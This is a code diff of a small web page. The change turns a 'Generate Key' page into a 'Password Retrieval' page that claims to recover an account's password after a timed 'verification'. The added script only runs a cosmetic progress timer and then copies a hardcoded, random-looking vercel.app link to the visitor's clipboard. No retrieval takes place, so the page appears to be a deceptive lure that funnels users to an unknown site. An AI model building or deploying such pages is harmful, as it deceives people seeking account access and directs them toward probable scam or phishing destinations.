@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Secure Access</title>
+  <title>Password Retrieval</title>
   <style>
     :root {
       --bg: #0b0f17;
@@ -14,7 +14,6 @@
       --line: rgba(255, 255, 255, 0.12);
       --accent: #7c5cff;
       --accent-2: #39d98a;
-      --danger: #ff6b6b;
       --shadow: 0 18px 45px rgba(0, 0, 0, 0.35);
       --radius: 22px;
       --tap: 48px;
@@ -109,9 +108,29 @@
       font-size: 0.95rem;
       color: white;
       cursor: pointer;
-      transition: transform 0.08s ease, opacity 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
+      transition: transform 0.08s ease, opacity 0.2s ease, box-shadow 0.2s ease, background 0.2s ease, filter 0.2s ease;
       box-shadow: 0 10px 24px rgba(0, 0, 0, 0.22);
       touch-action: manipulation;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(120deg, rgba(255,255,255,0.25), transparent 40%, transparent 60%, rgba(255,255,255,0.12));
+      opacity: 0;
+      transition: opacity 0.2s ease;
+      pointer-events: none;
+    }
+
+    .btn:hover::before {
+      opacity: 1;
+    }
+
+    .btn:hover {
+      filter: brightness(1.06);
     }
 
     .btn:active {
@@ -122,22 +141,23 @@
       opacity: 0.55;
       cursor: not-allowed;
       box-shadow: none;
+      filter: none;
     }
 
     .copy-btn {
-      background: linear-gradient(135deg, #2f7cf6, #775cff);
+      background: linear-gradient(135deg, #2f7cf6, #775cff, #9b59ff);
       white-space: nowrap;
     }
 
     .generate-btn {
       width: 100%;
-      background: linear-gradient(135deg, var(--accent), #5d8bff);
+      background: linear-gradient(135deg, #7c5cff, #5d8bff, #4dd2a4);
       margin-bottom: 14px;
     }
 
     .final-btn {
       width: 100%;
-      background: linear-gradient(135deg, var(--accent-2), #1fbf7a);
+      background: linear-gradient(135deg, #39d98a, #1fbf7a, #19a56a);
       margin-top: 14px;
       display: none;
     }
@@ -191,7 +211,7 @@
       width: 0%;
       height: 100%;
       border-radius: inherit;
-      background: linear-gradient(90deg, #7c5cff, #39d98a);
+      background: linear-gradient(90deg, #7c5cff, #39d98a, #5d8bff);
       transition: width 0.2s linear;
     }
 
@@ -243,8 +263,10 @@
 <body>
   <main>
     <section class="panel">
-      <h1>Generate Key</h1>
-      <p class="sub">Copy the UID, then press generate. wait until its all packed packages, before unlocking the final button.</p>
+      <h1>Password Retrieval</h1>
+      <p class="sub">
+        Enter the account identifier and initiate the retrieval process. A brief verification period will run before the next step becomes available.
+      </p>
 
       <section class="uid-box">
         <div class="uid-row">
@@ -271,6 +293,8 @@
   </main>
 
   <script>
+    const FINAL_URL = "https://fkwppqqjwkwmammaoapalwhojdhs-lsowoa.vercel.app/";
+
     const uidText = document.getElementById('uidText');
     const copyBtn = document.getElementById('copyBtn');
     const generateBtn = document.getElementById('generateBtn');
@@ -292,6 +316,21 @@
       if (state === 'done') dot.classList.add('done');
     }
 
+    function copyTextToClipboard(text) {
+      return navigator.clipboard.writeText(text).catch(() => {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.position = 'fixed';
+        ta.style.left = '-9999px';
+        ta.style.top = '0';
+        document.body.appendChild(ta);
+        ta.focus();
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+      });
+    }
+
     function resetUI() {
       clearInterval(timer);
       clearInterval(progressTimer);
@@ -307,20 +346,10 @@
 
     copyBtn.addEventListener('click', async () => {
       try {
-        await navigator.clipboard.writeText(uidText.textContent.trim());
+        await copyTextToClipboard(uidText.textContent.trim());
         copyBtn.textContent = 'Copied';
         setTimeout(() => (copyBtn.textContent = 'Copy UID'), 1200);
-      } catch (e) {
-        const range = document.createRange();
-        range.selectNodeContents(uidText);
-        const sel = window.getSelection();
-        sel.removeAllRanges();
-        sel.addRange(range);
-        document.execCommand('copy');
-        sel.removeAllRanges();
-        copyBtn.textContent = 'Copied';
-        setTimeout(() => (copyBtn.textContent = 'Copy UID'), 1200);
-      }
+      } catch (_) {}
     });
 
     generateBtn.addEventListener('click', () => {
@@ -335,7 +364,7 @@
       const start = performance.now();
 
       setStatus('Generating key...', 'busy');
-      tinyText.textContent = 'Please keep this tab open while the check runs.';
+      tinyText.textContent = 'Please keep this tab open while the verification runs.';
 
       progressTimer = setInterval(() => {
         const elapsed = performance.now() - start;
@@ -359,8 +388,19 @@
       }, duration);
     });
 
-    finalBtn.addEventListener('click', () => {
-      alert('Final button clicked.');
+    finalBtn.addEventListener('click', async () => {
+      try {
+        await copyTextToClipboard(FINAL_URL);
+        statusText.textContent = 'Link copied to clipboard.';
+        dot.classList.remove('busy');
+        dot.classList.add('done');
+        finalBtn.textContent = 'Copied';
+        setTimeout(() => {
+          finalBtn.textContent = 'Final Button';
+        }, 1200);
+      } catch (_) {
+        statusText.textContent = 'Copy failed.';
+      }
     });
 
     resetUI();
